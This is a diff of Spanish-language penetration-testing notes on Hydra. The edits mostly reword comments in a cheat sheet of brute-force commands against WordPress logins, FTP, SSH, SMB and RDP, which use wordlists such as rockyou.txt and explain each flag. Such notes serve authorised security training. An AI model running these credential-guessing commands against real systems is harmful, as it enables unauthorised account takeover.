@@ -60,26 +60,26 @@ Es una herramienta de prueba de penetración que se utiliza para realizar ataque
 # Para identificar los usuarios 
 ❯ hydra -L users.txt -p something <IP> http-post-form '/wp-login.php:log=^USER^&pwd=^PASS^:F=Invalid username'
 ❯ hydra -L users.txt -p something <IP> http-post-form '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=Invalid username'  # Otra forma de hacerlo
-	# p = Colocaremos una passwd random, porque lo unico que queremos es el usuario
+	# p = Colocar una passwd random, porque lo unico que se busca es el usuario
 
 
-# Esto se usa para saber la password del usuario que hemos encontrado 'admin'
+# Esto se usa para saber la password del usuario que se ha encontrado 'admin'
 ❯ hydra -l admin -P /usr/share/metasploit-framework/data/wordlists/unix-passwords.txt <IP> http-post-form '/wordpress/wp-login.php:log=^USER^&pwd=^PASS^:S=302' 
 ❯ hydra -l admin -P /usr/share/metasploit-framework/data/wordlists/unix-passwords.txt <IP> http-post-form '/wordpress/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=is incorrect' -t 15 
 	# t = Lanzar las tareas en paralelo al mismo tiempo 
 
 
-# Si al momento de hacer login en la pagina esta te muestra un mensaje de error, seria de esta manera. Donde colocaremos el mensaje de error en la sentencia. 
+# Si al momento de hacer login en la pagina muestra un mensaje de error, seria de esta manera en donde se colocará el mensaje de error en la sentencia. 
 ❯ hydra -l admin -P /usr/share/metasploit-framework/data/wordlists/unix-passwords.txt <IP> http-post-form "/login.php:login=^USER^&password=^PASS^&security_level=0&form=submit:Invalid credentials or user not activated!"
 
 
-# Haremos un ataque de fuerza bruta a WordPress (Todo lo anterior lo obtenemos de la misma página web en 'form action=/login.php') y colocamos todas la etiquetas 
+# Fuerza bruta a WordPress (Todo lo anterior se obtiene de la página web en 'form action=/login.php') y hay que colocar todas la etiquetas 
 
 	# l (ele) = Usuario de login
 	# P = Ruta del diccionario
-	# log y pwd = Lo podemos encontrar en el apartado de la pagina web 'Ctrl + u' 
+	# log y pwd = Se encuentra en el apartado de la pagina web 'Ctrl + u' 
 	# S = Redireccionamiento con el codigo 302
-	# F = Error que nos muestre el panel de autenticacion, por si no sirve con el 'S'
+	# F = Error que muestra el panel de autenticacion, por si no sirve con el 'S'
 ```
 
 ## Hydra fuerza bruta WebDAV
@@ -105,14 +105,16 @@ Es una herramienta de prueba de penetración que se utiliza para realizar ataque
 
 ## Hydra fuerza bruta FTP
 
-```python
-❯ hydra -l omar -P /usr/share/wordlists/rockyou.txt ftp://❮IP❯ -t 15 # Haremos un ataque de fuerza bruta al puerto SSH, antes de completar el comando con soble TAB podemos ver la lista de diccionarios
+```ruby
+❯ hydra -L Usernames.txt -P Passwords.txt ❮IP❯ ftp   # Fuerza bruta al puerto 21 'FTP'
+
+❯ hydra -l omar -P /usr/share/wordlists/rockyou.txt ftp://❮IP❯ -t 15 
 
 ❯ hydra -L /usr/share/metasploit-framework/data/wordlists/unix_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt ❮IP❯ ftp -t 4 -I
 
-	# l (ele) = Usuario de login
-	# L = Indicas un archivo que disponga de usuarios 
-	# P = Ruta del diccionario o 'archivo que contiene passwds'
+	# l (ele) = Usuario valido
+	# L = Archivo de texto que contiene usuarios 
+	# P = Ruta del diccionario de passwords
 	# t = Lanzar tareas en paralelo al mismo tiempo
 	# I = Saltar la espera 
 ```
@@ -127,19 +129,16 @@ Es una herramienta de prueba de penetración que se utiliza para realizar ataque
 ```
 
 ```python
-❯ hydra -L /usr/share/metasploit-framework/data/wordlists/unix_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt ssh://❮IP❯ -t 4
-# Haremos un ataque de fuerza bruta al puerto SSH
+❯ hydra -L /usr/share/metasploit-framework/data/wordlists/unix_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt ssh://❮IP❯ -t      # Fuerza bruta al puerto 22 'SSH'
 
 	# ssh = Puerto al que vamos a atacar 22
 	# IP = Direccion de la maquina victima
 	# P = Ruta del diccionario o 'archivo que contiene passwds'
 	# L = Ruta del diccionario o 'archivo que contiene users' para login
 	# t = Lanzar tareas en paralelo al mismo tiempo
-```
 
-```python
 ❯ hydra -l root -P /usr/share/wordlists/rockyou.txt ❮IP❯ ssh
-❯ hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://❮IP❯ -t 15 -V -s 2222 # Haremos un ataque de fuerza bruta al puerto SSH, antes de completar el comando con soble TAB podemos ver la lista de diccionarios
+❯ hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://❮IP❯ -t 15 -V -s 2222
 
 	# ssh = Puerto al que vamos a atacar 22
 	# IP = Direccion de la maquina victima
@@ -155,10 +154,10 @@ Es una herramienta de prueba de penetración que se utiliza para realizar ataque
 ```python 
 # Si esta  la version 'SMBv1', no podremos usar esta herramienta para Fuerza Bruta, solo con Metasploit
 
-❯ hydra -l admin -P /usr/share/wordlists/rockyou.txt smb://<IP>        # Fuerza bruta al usuario en el servidor SMB
+❯ hydra -l admin -P /usr/share/wordlists/rockyou.txt smb://<IP>        # Fuerza bruta en el servidor SMB
 ❯ hydra -l admin -P /usr/share/wordlists/rockyou.txt <IP> smb
 
-❯ hydra -L user.list -P password.list smb://<IP>        # Para ver si esos usuarios y passwd son validos en un servidor SMB
+❯ hydra -L user.list -P password.list smb://<IP> 
 
 	# L = Ruta o archivo que contiene los usuarios para login
 	# P = Ruta o archivo que contiene las passwd
@@ -178,7 +177,7 @@ Es una herramienta de prueba de penetración que se utiliza para realizar ataque
 ## Hydra fuerza bruta RDP
 
 ```python 
-# Brute force para encontrar usuarios y sus passwd en RDP
+# Fuerza bruta en RDP
 ❯ hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt rdp://<IP> -s 3333           
 
 	# L = Ruta o archivo que contiene los usuarios para login 
